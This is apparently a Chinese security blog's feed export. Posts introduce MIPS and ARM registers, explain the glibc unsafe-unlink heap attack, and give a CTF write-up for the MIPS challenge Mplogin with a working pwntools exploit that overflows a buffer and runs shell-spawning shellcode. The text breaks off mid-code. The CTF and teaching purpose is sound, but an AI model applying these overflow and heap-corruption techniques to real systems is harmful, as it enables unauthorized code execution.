        <content type="html"><![CDATA[<h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>​        当初和ARM比肩的MIPS，由于决策的问题和命途多舛，MIPS架构开始逐渐没落，曾经的辉煌也慢慢暗淡，但世间还残留着MIPS架构的余光，在目前的游戏机，打印机，路由器还有很多是MIPS架构的CPU，所以MIPS的学习并不能落下，而且学习各种CPU架构的设计思路，对于理解计算机也有着很大的帮助，虽然MIPS没落了，但RISC-V会带着它的余光继续前进…</p><p><a href="https://zhuanlan.zhihu.com/p/356011887">全球三大芯片架构之一MIPS倒下！转身投入RISC-V阵营</a></p><p><a href="https://zhuanlan.zhihu.com/p/97572364">MIPS，路在何方？</a></p><h2 id="MIPS各寄存器介绍与对比"><a href="#MIPS各寄存器介绍与对比" class="headerlink" title="MIPS各寄存器介绍与对比"></a>MIPS各寄存器介绍与对比</h2><p>与ARM和相比，MIPS也有很多特殊的特性，这些特性都旨在帮助CPU更好的完成工作</p><ol><li><p><strong>$zero寄存器</strong>时刻保存着常量0，至于为什么这么做，答：还是为了效率</p><blockquote><p>零寄存器始终保持常量 0，除了 0 恰好是一个非常有用的常量这一事实之外，它并没有什么特别之处。如此有用以至于 MIPS 设计者专门使用一个寄存器来保存其值。（这样你就不必浪费另一个寄存器或任何内存来保存值。）</p></blockquote></li><li><blockquote><p>$1:即$at，该寄存器为汇编保留，由于<a href="https://blog.csdn.net/wlswls1711/article/details/106364882/">I型指令</a>的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要<br>把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 lui（装入高位立即数）和addi两条<br>指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这<br>也是为汇编 保留$at的原因之一</p></blockquote><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/3.png" class=""></li><li><p>v0<del>v1是函数调用返回之后的值，v也就是values的意思，a0</del>a3就是函数的参数，如果有更多的参数，则通过栈来传递，t0<del>t9都是Temporary寄存器，可以理解为随便使用，但需要注意的是t7和t8，t9并不是挨在一起的，中间还搁着s0</del>s7，着8个寄存器那就不是随便使用的了，如果要使用他们必须将他们保存，否则程序可能会出现非预期的错误，k0~k1是给操作系统使用的，暂不考虑</p></li><li><p>剩下的就是有特殊用途的寄存器，对应的英文也标识了，很容易理解，这里强调一下$ra寄存器，当调用的函数属于叶子函数的时候，会直接把返回值放到$ra寄存器里面，若是非叶子函数的话，就会把返回地址放到栈上，稍微解释一下叶子函数：此函数自身不再调用别的函数就称之为叶子函数</p></li></ol><table><thead><tr><th align="left">寄存器编号</th><th align="left">别名</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">$0</td><td align="left">$zero</td><td align="left">常量0(constant value 0)</td></tr><tr><td align="left">$1</td><td align="left">$at</td><td align="left">保留给汇编器(Reserved for assembler)</td></tr><tr><td align="left">$2-$3</td><td align="left">$v0-$v1</td><td align="left">函数调用返回值(values for results and expression evaluation)</td></tr><tr><td align="left">$4-$7</td><td align="left">$a0-$a3</td><td align="left">函数调用参数(arguments)</td></tr><tr><td align="left">$8-$15</td><td align="left">$t0-$t7</td><td align="left">暂时的(Temporary)</td></tr><tr><td align="left">$16-$23</td><td align="left">$s0-$s7</td><td align="left">保存的(或如果用，需要SAVE/RESTORE的)</td></tr><tr><td align="left">$24-$25</td><td align="left">$t8-$t9</td><td align="left">暂时的(Temporary)</td></tr><tr><td align="left">$26-$27</td><td align="left">$k0-$k1</td><td align="left">内核的(kernel)</td></tr><tr><td align="left">$28</td><td align="left">$gp</td><td align="left">全局指针(Global Pointer)</td></tr><tr><td align="left">$29</td><td align="left">$sp</td><td align="left">堆栈指针(Stack Pointer)</td></tr><tr><td align="left">$30</td><td align="left">$fp/$s8</td><td align="left">栈帧指针(Frame Pointer)</td></tr><tr><td align="left">$31</td><td align="left">$ra</td><td align="left">返回地址(return address)</td></tr></tbody></table><p>MIPS寄存器经典表格，但是我看到之后就有点疑惑，为啥MIPS的寄存器有个别名的东西，奇了怪了，还真没见过，那它为啥要有别名呢？网上的解释是”注记符”，但是它既然好记为啥不直接拿它命名呢？在ARM上也是以r开头命名的，并没有这么易懂的别名</p><p><a href="https://mathcs.holycross.edu/~csci226/MIPS/summaryHO.pdf">The MIPS Instruction Set</a></p><p>在和常见的X86和X64对比下更容易明白他们之间的差别和各自的好处：</p><table><thead><tr><th>架构</th><th>x86</th><th>X64</th><th>ARM</th><th>MIPS</th></tr></thead><tbody><tr><td>函数返回值</td><td>eax</td><td>rax</td><td>r0</td><td>v0~v1</td></tr><tr><td>函数调用参数</td><td>栈</td><td>rdi-rsi-rdx-rcx-r8-r9；栈</td><td>r0~r3；栈</td><td>a0~a3；栈</td></tr><tr><td>栈指针</td><td>ebp；esp</td><td>rbp；rsp</td><td>fp(r11)；sp(r13)</td><td>fp/s8；sp</td></tr><tr><td>返回地址</td><td>进入子函数时会将返回地址压入栈中</td><td>进入子函数时会将返回地址压入栈中</td><td>lr(r14)寄存器保存着子程序的返回地址</td><td>ra寄存器保留程序的返回地址（叶子函数）</td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="MIPS汇编指令"><a href="#MIPS汇编指令" class="headerlink" title="MIPS汇编指令"></a>MIPS汇编指令</h2><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/1.png" class=""><p>IDA上有个很好用的选项，Options =&gt; General =&gt; Auto comments ，当你把它勾选上的时候，IDA会在一些指令的旁边显示注释帮助你理解这条汇编指令大致在做什么事情：</p><img src="/2021/10/05/%E4%BB%8EMIPS%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6MIPS/2.jpg" class=""><h2 id="MPIS缓存问题"><a href="#MPIS缓存问题" class="headerlink" title="MPIS缓存问题"></a>MPIS缓存问题</h2><p><a href="https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm">为什么我完美的 Shellcode 不起作用？：MIPS 和 ARM 上的缓存一致性</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MIPS!MIPS!MIPS! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ARM的发展史开始学ARM</title>
      <link href="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/"/>
      <url>/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/</url>
      
        <content type="html"><![CDATA[<h1 id="从ARM的发展史开始学ARM"><a href="#从ARM的发展史开始学ARM" class="headerlink" title="从ARM的发展史开始学ARM"></a>从ARM的发展史开始学ARM</h1><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>第一个ARM处理器是1983年10月-1985年4月间在英国剑桥的Acorn Computer公司开发的。那时候ARM代表Acon RISC Machine公司，并一直持续到Advanced RISC Machinelimited(ARM Limited)在1990年成立之前。</p><p>Aconn因为BBC(英国广播公司)微型计算机的成功而在英国个人计算机市场占据了强有力的位置。BBC微型计算机是以8位6502微处理器为核心的机器。</p><p>随着BBC在1982年1月一系列电视节日的介绍，它迅速成为英国学校的主流机器。它还在计算<br>机爱好者的市场上享有热烈的支持，并找到了进人–些研究性实验室和高等教育组织的途径。<br>随着BBC微机的成功，Acorn的工程师考虑用不同的微处理器去构造另一种机器。他们发现所有的商业供货均不充足。1983年可得到的16位CISC微处理器比标准的存储器部件还慢。它们也有一些多时钟周期完成的指令(在一些情况下，需要数百个时钟周期),使其有很长的中断等待时间。BBC微机很大程度上得益于6502的快速中断响应。因此，Acorn的设计者不愿意接受处理器性能方面的退步。<br>由于在商业微处理器的供货方面遭受的这些挫折，专有微处理器的设计被提到议<br>事日程。主要的障碍是Acorn小组知道商业微处理器需要花费数百个人年的设计努力。Acorn不可能指望这样规模的投资,因为它是一个总共仅有400多雇员的公司。他们必须用少量的设计成本生户出比较好的产品，而且除了为BBC微机设计过少量的小规模门阵列之外它们在全定制芯片设计方面没有任何经验。<br>在这明显不可能的情况下，伯克利RISCI的论文带来一线生机。它是由少数研究生在一年内设计完成的处理器，品质与领先的商业货源不相上下。它的结构简单，因而<br>没有复杂的指令来损害中断执行时间。还有。些支持的论据，认为它能指引未来的道<br>路，虽然技术的优点不论怎样得到学术界的支持也不能保证商业的成功。<br>ARM由于各种因素的偶然组合而诞生，成为Acorn产品线的核心部分。后来，在明智地将缩写字ARM的意义修改为Advanced RISC Machine以后，它把它的名字借给新组成的公司去在Acorn的产品范围之外扩展市场。尽管名称变化了,体系结构仍保持同原Acorn的设计相近。</p><p><a href="https://zhuanlan.zhihu.com/p/370771150">ARM芯片的发展历史</a></p><p><a href="https://zhuanlan.zhihu.com/p/198903715">ARM发家史，一家无名公司的逆袭</a></p><h2 id="ARM芯片的命名"><a href="#ARM芯片的命名" class="headerlink" title="ARM芯片的命名"></a>ARM芯片的命名</h2><p>ARM的芯片有几种版本号</p><ul><li>ARM内核版本号</li><li>ARM SoC的版本号</li><li>芯片的型号</li></ul><h2 id="ARM架构寄存器介绍"><a href="#ARM架构寄存器介绍" class="headerlink" title="ARM架构寄存器介绍"></a>ARM架构寄存器介绍</h2><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><p>32位的ARM有16个寄存器（不包含标志位寄存器），通常R0~R10都是通用寄存器，而其他的寄存器都是有特定功能的寄存器，相比之下X86只有9个寄存器</p><ol><li>R0~R3用作<strong>传递参数</strong>的，如果参数大于4个就用栈来传递，在X86架构下的传递参数是通过栈来完成的，在X86-64下才用6个寄存器来传递参数，R0是函数的返回值，和RAX差不多</li><li>R4~R11是保持局部变量的寄存器，也就是说<strong>子程序在运行期间若要使用这些寄存器在进入的时候要保存这类寄存器的值</strong>，R7存放了<strong>系统调用号</strong>，R11是BP</li><li>R12是<strong>过程调用中间临时寄存器</strong>，叫做IP，R13是SP（栈指针），R14<strong>是连接寄存器，叫做LR，保持子程序的返回地址</strong>，R15就是程序计数器（PC），<strong>存储当前指令的地址加8（两个ARM指令），在Thumb（v1）状态下存储当前指令的地址加4（两个Thumb指令）。这与x86不同，x86中PC始终指向要执行的下一条指令</strong></li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/1.png" class=""><p>和X86相比，有几点不同之处：</p><ol><li>32位就已经开始用寄存器传递参数</li><li>有专门的寄存器是存储系统调用号的</li><li>多了两个关于子程序的寄存器R12和R14</li></ol><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/2.png" class=""><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><p>和32位大差不差，就是把R换成了X，位数翻倍并加多了一些寄存器</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/image-20210902171755319.png" class="" title="image-20210902171755319"><h2 id="ARM汇编指令"><a href="#ARM汇编指令" class="headerlink" title="ARM汇编指令"></a>ARM汇编指令</h2><h2 id="ARM特色"><a href="#ARM特色" class="headerlink" title="ARM特色"></a>ARM特色</h2><h4 id="指令定长"><a href="#指令定长" class="headerlink" title="指令定长"></a>指令定长</h4><h4 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h4><p>Thumb是ARM的另一个指令集，也就是说ARM和Intel的指令集不同，它有两套指令集，一个是前面说的Thumb，另一个就是传统的ARM指令集，它们两个不同的地方就在于指令的长度不同，Thumb 指令每条 16 位长，并有相应的 32 位 ARM 指令，而传统的ARM都是32位的，所以Thumb是2字节的指令，传统的ARM是四字节的，需要注意的是当标志位寄存器当中的第5位为1时是Thumb模式</p><img src="/2021/10/05/%E4%BB%8EARM%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2%E5%BC%80%E5%A7%8B%E5%AD%A6ARM/4.png" class=""><p><a href="https://www.cnblogs.com/zhangshenghui/p/5944964.html">ARM程序状态寄存器</a></p><p><a href="https://www.embedded.com/introduction-to-arm-thumb/">介绍 ARM 中的thumb</a></p><p>它为啥需要两个指令集呀？在这就要引入一个概念**”代码密度”**，我们都知道ARM架构千好万好，其本质还是RISC决定的，但是它有一个很要命的缺点，就是和CISC相比RISC的代码密度低，其代码密度低是指令定长的缘故，代码密度低会导致任何时候只有少部分指令被加载进Cache，这就意味着Cache的命中率大幅度降低，这时候CPU的工作效率就会明显减弱，与此同时功耗也会增加，最初解决这个问题的方法也很简单，就是增加它的带宽，但有个更好的办法就是Thumb，Thumb指令集是传统ARM指令集的压缩版，但它还是有保留一下传统ARM指令集的指令，并加入动态解压缩软件，使得代码密度的问题得到了解决</p>]]></content>
      
      
      
        <tags>
            
            <tag> ARM!ARM!ARM! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unsafe unlink</title>
      <link href="/2021/10/05/unsafe-unlink/"/>
      <url>/2021/10/05/unsafe-unlink/</url>
      
        <content type="html"><![CDATA[<blockquote><p>以前一直搞不明白<code>unlink</code>，直到学了点数据结构….</p></blockquote><p><code>unlink</code>分为<strong>向前合并</strong>和<strong>向后合并</strong>两种脱链方式，是为了减少堆块的碎片化所提出的，当一个处于free状态的堆块的前后堆块被<code>free</code>的时候，就是触发<code>unlink</code>机制将两个小的堆块合并成一个大的堆块，<code>unsafe unlink</code>问题就是出现在合并的时候检查没有到位导致的</p><p>wiki上的脱链示意图，当进行脱链的时候FD的<code>bk</code>指向BK，BK的<code>fd</code>指向FD</p><img src="/2021/10/05/unsafe-unlink/1.png" class=""><p>但是<code>unlink</code>也不是随便进行的，还需要通过下面的检查才能进行<code>unlink</code>，但在很早以前，它并没有这种机制，我们先通过介绍没有检查的情况，然后在此基础上进行修改，实现现在的<code>unlink</code>攻击手法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,                                      </span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><h4 id="以前的unlink"><a href="#以前的unlink" class="headerlink" title="以前的unlink"></a>以前的unlink</h4><p>以32位程序为例</p><p>假设申请了三个堆块，并存在堆溢出，我们先将<code>chunk 2</code>给<code>free</code>掉，然后利用堆溢出覆盖<code>fd</code>和<code>bk</code></p><p>我们回忆一下，<code>unlink</code>会执行啥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FD = P -&gt; fd = free@got - 12</span><br><span class="line"></span><br><span class="line">BK = P -&gt; bk = system@got</span><br><span class="line"></span><br><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12 = system@got</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8 = free@got</span><br></pre></td></tr></table></figure><p>执行完之后，<code>free@got</code>就变成了<code>system@got</code>，还要一点需要注意的是<code>system@got + 8 = free@got</code>，如果没有改回来有可能会发送一下奇奇怪怪的事情</p><img src="/2021/10/05/unsafe-unlink/2.png" class=""><h4 id="目前的unlink"><a href="#目前的unlink" class="headerlink" title="目前的unlink"></a>目前的unlink</h4><p>讲完没有检查的情况，接下来就是有检查的情况了，它只要检查的是<code>FD-&gt;bk != P || BK-&gt;fd != P</code></p><p>只要绕过这个检查就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8</span><br></pre></td></tr></table></figure><p>我们看看刚刚的转换，明显不相等，是吧！</p><p>那按照这个检查，我们就可以进行伪造，这样一来就相等了对吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk =&gt; (p - 12) + 12 = p</span><br><span class="line"></span><br><span class="line">BK -&gt; fd =&gt; (p - 8) + 8 = p</span><br></pre></td></tr></table></figure><p>那么最终实现的效果就是，跟刚刚的直接修改GOT表相比，只是修改了<code>chunk</code>的指针，反差有点大，但是它还是有它的攻击效果的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(p - 8) + 8 = p - 12</span><br></pre></td></tr></table></figure><p>例题为<strong>2016 ZCTF note2</strong>，参考《<code>buu</code>刷题记之PWN系列》向前和向后合并的源码解析都在那，这里就不赘述了！</p><h4 id="完整源码分析"><a href="#完整源码分析" class="headerlink" title="完整源码分析"></a>完整源码分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line"><span class="comment">//检查chunk的size如果和nextchunk的prev_size不相等就报错</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);                              </span><br><span class="line">    FD = P-&gt;fd;                                                                     </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);                           </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        FD-&gt;bk = BK;                                                              </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//下面是largechunk的检查   </span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                             </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class="line">                &#125;                                                              </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class="line">            &#125;                                                                                 &#125;                                                                      </span><br><span class="line">       &#125;                                                                              &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS PWN入门</title>
      <link href="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/"/>
      <url>/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="2021HWS冬令营入营赛赛题–Mplogin"><a href="#2021HWS冬令营入营赛赛题–Mplogin" class="headerlink" title="2021HWS冬令营入营赛赛题–Mplogin"></a>2021HWS冬令营入营赛赛题–Mplogin</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/1-1633421980904.png" class=""><p>32位小端序，并且全红，<code>xuanxuan</code>老师说MIPS不支持NX，去查阅资料，没找到相关的文章，不过在复现RV110W的时候，它确实没有NX…</p><blockquote><p>当然MIPS硬件本身也不支持NX机制</p></blockquote><p>程序就两主要的函数，逻辑也很简单，经典<code>read</code>无截断泄露地址，这个地址是什么地址等下动态的时候在看</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/2-1633421980904.png" class="">第二个函数就存在溢出，人家v2就20字节读了36字节，溢出到v3了都，下一个`read`的时候，就能无限制读，直接覆盖返回地址，劫持控制流，后面还有检查，注意一下就行...<img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/3-1633421980905.png" class=""><p>开始调试…和X86不同，异架构的PWN就需要用到远程调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 1234 -L ./ ./Mplogin</span><br></pre></td></tr></table></figure><p>-g ：暴露调试端口</p><p>-L ：在程序寻找动态链接库的时候优先在此目录下寻找</p><p>之后，我们就可以再启动一个窗口用<code>gdb-mutilarch</code>连接上我们的<code>qemu</code>暴露的调试接口，连接之后就可以进行调试啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> arch mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>再<code>0x4008D4</code>处下断点，看看它泄露的地址到底是啥，它因为没有开地址随机化，所以一直都是这个地址，很容易就认出来，可以看到泄露的是栈顶指针</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/6.jpg" class=""><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/4-1633421980905.png" class=""><blockquote><p>由于MIPS的特殊性，在函数体中<code>$fp</code>和 <code>$sp</code>是相同的，即都指向栈顶，故这里泄露出的就是<code>main</code>函数进入<code>sub_400840</code>是的栈顶地址</p></blockquote><p>下面测试在第二个函数溢出的偏移，直接发生<code>cyclic(200)</code>的字符，测试出偏移是30（不包括前面的0123456789</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>+cyclic(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/5-1633421980905.png" class=""><p>直接<code>jmp sp</code>加<code>shellcode</code>拿<code>sehll</code>一气呵成…</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Username : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;admin&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]addr =&gt; &quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Pre_Password : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;access&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">14</span>+p32(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+p32(addr)+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>小问题&amp;&amp;以后要注意的问题：</p><p>调试的时候一堆SW是什么鬼？？？</p><p>以后在发送数据的时候千万要注意，换行符对<code>payload</code>的影响…</p><h4 id="2021HWS冬令营入营赛赛题–pwn"><a href="#2021HWS冬令营入营赛赛题–pwn" class="headerlink" title="2021HWS冬令营入营赛赛题–pwn"></a>2021HWS冬令营入营赛赛题–pwn</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/8.png" class=""><p>开了<code>canary</code>，但在实际测试中<code>canary</code>并没有起效，怀疑是<code>qemu</code>本身不支持<code>canary</code>（不太清楚，qemu本身不支持NX是真的）</p><p>程序就一个<code>pwn</code>函数，应该就是关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 